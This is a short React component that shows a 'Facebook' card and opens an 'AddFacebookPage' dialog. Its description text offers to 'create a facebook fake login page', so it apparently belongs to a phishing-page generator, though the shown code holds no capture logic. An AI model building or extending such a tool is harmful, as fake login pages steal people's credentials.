import Card from "../../../../shared/components/ui/card";
import { useState } from "react";
import AddFacebookPage from "./add-facebook-page";

const FacebookCard = () => {
  const [isOpen, setIsOpen] = useState(false);
  return (
    <>
      <Card
        title="Facebook"
        decription="you can create a facebook fake login page by clicking here"
        imageURL="../../../../../public/covers/facebook-cover.jpg"
        onClick={() => setIsOpen(true)}
      />
      <AddFacebookPage isOpen={isOpen} setIsOpen={setIsOpen} />
    </>
  );
};

export default FacebookCard;
